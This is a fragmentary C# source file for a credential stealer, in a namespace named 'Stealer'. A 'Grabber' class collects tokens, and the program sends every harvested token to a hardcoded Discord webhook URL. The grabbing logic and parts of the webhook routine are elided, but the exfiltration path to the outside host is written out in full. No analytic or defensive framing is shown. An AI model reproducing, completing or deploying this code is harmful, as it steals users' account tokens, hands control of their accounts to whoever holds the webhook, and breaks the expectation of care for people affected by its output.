...
namespace Stealer
{
    class Grabber
    {
        ...
        public static async Task SendToWebhook(string webhookUrl, string message)
        {
    ...
    class Program
    {
        ...
        {
            var tokens = Grabber.Grab();
            if(tokens.Any())
            {
                string allTokens = string.Join("\\n", tokens);
                string webhookUrl = "https://discord.com/api/webhooks/1424453026302922842/ixPYfx02_lFj6eUyz7Ws2h-hp0COzNr4Y-bPCzxWZlmITTbSr6gaQxul2TxEGaRUC2lz";
                await Grabber.SendToWebhook(webhookUrl, allTokens);
            }
        }
    }
}
